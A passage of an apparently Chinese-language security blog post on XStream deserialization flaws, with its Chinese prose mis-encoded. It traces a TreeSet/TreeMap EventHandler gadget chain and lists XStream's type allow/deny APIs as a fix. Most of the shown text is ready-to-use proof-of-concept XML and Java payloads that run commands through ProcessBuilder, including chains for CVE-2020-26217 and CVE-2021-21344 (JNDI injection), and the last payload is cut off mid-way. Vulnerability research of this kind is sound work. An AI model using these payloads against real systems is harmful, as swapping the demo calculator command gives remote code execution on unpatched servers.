src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031154835188.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031154835188.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241031154835188"></p><p>æ¥ç€è°ƒç”¨putï¼Œè¿™é‡Œè°ƒç”¨çš„åº”è¯¥æ˜¯TreeMapé‡å†™çš„put</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031155250205.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031155250205.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241031155250205"></p><p>putå†…è°ƒç”¨äº†compare</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031155347539.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031155347539.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241031155347539"></p><p>ç”¨äº†Comparableæ¥å£çš„compareTo</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031155413191.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031155413191.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241031155413191"></p><p>è¿™é‡Œk1å¦‚æœæ˜¯EventHandlerï¼Œé‚£EventHandlerä»£ç†Comparableæ¥å£ï¼Œä¸å°±èƒ½é¡ºåˆ©è§¦å‘åˆ°invokeäº†å˜›</p><p>POC XMLï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tree-set</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tree-set</span>&gt;</span></span><br></pre></td></tr></table></figure><p>POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EventHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&lt;tree-set&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\t&lt;dynamic-proxy&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;handler class=\&quot;java.beans.EventHandler\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;target class=\&quot;java.lang.ProcessBuilder\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;command&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;string&gt;calc&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;/command&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;/target&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;action&gt;start&lt;/action&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;/handler&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;/dynamic-proxy&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/tree-set&gt;&quot;</span>;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        xStream.fromXML(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tree-setèƒ½ç”¨ï¼Œtree-mapè‚¯å®šä¹Ÿèƒ½ç”¨ï¼Œæ¯•ç«Ÿtree-mapçš„unmarshalä¹Ÿè°ƒç”¨äº†populateTreeMap</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031155750836.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031155750836.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241031155750836"></p><p>éšä¾¿åŠ ä¸ªvalueç»„æˆEntry</p><p>POC XMLï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tree-map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>godown<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tree-map</span>&gt;</span></span><br></pre></td></tr></table></figure><p>POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EventHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&lt;tree-map&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\t&lt;dynamic-proxy&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;handler class=\&quot;java.beans.EventHandler\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;target class=\&quot;java.lang.ProcessBuilder\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;command&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;string&gt;calc&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;/command&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;/target&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;action&gt;start&lt;/action&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;/handler&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;/dynamic-proxy&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;string&gt;godown&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;/entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/tree-map&gt;&quot;</span>;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        xStream.fromXML(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h3><p>XStream&gt;&#x3D;1.4.7æ—¶ï¼ŒXStreamèƒ½æ‰‹åŠ¨è®¾ç½®é»‘ç™½åå•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">XStream.addPermission(TypePermission);</span><br><span class="line">XStream.allowTypes(Class[]);</span><br><span class="line">XStream.allowTypes(String[]);</span><br><span class="line">XStream.allowTypesByRegExp(String[]);</span><br><span class="line">XStream.allowTypesByRegExp(Pattern[]);</span><br><span class="line">XStream.allowTypesByWildcard(String[]);</span><br><span class="line">XStream.allowTypeHierary(Class);</span><br><span class="line">XStream.denyPermission(TypePermission);</span><br><span class="line">XStream.denyTypes(Class[]);</span><br><span class="line">XStream.denyTypes(String[]);</span><br><span class="line">XStream.denyTypesByRegExp(String[]);</span><br><span class="line">XStream.denyTypesByRegExp(Pattern[]);</span><br><span class="line">XStream.denyTypesByWildcard(String[]);</span><br><span class="line">XStream.denyTypeHierary(Class);</span><br></pre></td></tr></table></figure><p>1.4.10ç‰ˆæœ¬ä¹‹åï¼ŒXStreamæä¾›äº†XStream.setupDefaultSecurity()å‡½æ•°æ¥ä¸€é”®è®¾ç½®XStreamååºåˆ—åŒ–ç±»å‹çš„é»˜è®¤ç™½åå•ï¼Œå¼€äº†è¿™ä¸ªè®¾ç½®çš„éƒ½æ‰“ä¸äº†ã€‚ä¸‹é¢éƒ½æ˜¯ç»•è¿‡é»˜è®¤é»‘åå•çš„</p><p>åé¢çš„ç»•è¿‡éƒ½ä¸å¤ªæƒ³åˆ†æäº†ï¼Œç›´æ¥è´´ä¸ªPOCï¼Œæ„Ÿè§‰åˆ†æçš„æ„ä¹‰ä¹Ÿä¸å¤§ï¼Œå®˜ç½‘éƒ½ä¼šè´´POC</p><h2 id="CVE-2020-26217"><a href="#CVE-2020-26217" class="headerlink" title="CVE-2020-26217"></a>CVE-2020-26217</h2><p>XStream&lt;&#x3D;1.4.13</p><p>ç”¨Base64Dataç»•è¿‡é»‘åå•</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.spi.FilterIterator&#x27;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.ArrayList$Itr&#x27;</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>1<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>open<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>/Applications/Calculator.app<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;/<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">iter</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.ImageIO$ContainsFilter&#x27;</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">method</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">method</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">next</span>/&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">pos</span>&gt;</span>0<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>test<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="CVE-2021-21344"><a href="#CVE-2021-21344" class="headerlink" title="CVE_2021_21344"></a>CVE_2021_21344</h2><p>XStream&lt;&#x3D;1.4.15</p><p>JdbcRowSetImpl JNDIæ³¨å…¥</p><p>POC XMLï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bi</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">jaxbType</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">jaxbType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">uriProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">attributeProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">inheritedAttWildcard</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">getter</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">name</span>&gt;</span>getDatabaseMetaData<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">getter</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">inheritedAttWildcard</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">bi</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tagName</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">context</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">marshallerPool</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">marshallerPool</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">nameList</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">localNames</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">localNames</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">nameList</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">jaxbObject</span> <span 